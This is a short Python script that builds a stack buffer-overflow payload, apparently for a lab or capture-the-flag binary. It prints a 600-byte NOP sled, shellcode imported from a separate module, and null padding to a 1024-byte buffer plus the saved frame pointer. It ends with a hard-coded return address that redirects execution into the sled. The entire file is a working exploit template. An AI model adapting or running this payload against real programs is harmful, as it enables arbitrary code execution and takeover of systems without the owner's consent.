#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(b'\x90'*(600))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\x00'*(1024-600-len(shellcode)+8))
sys.stdout.buffer.write(0x7FFFFFF6923C.to_bytes(8,'little'))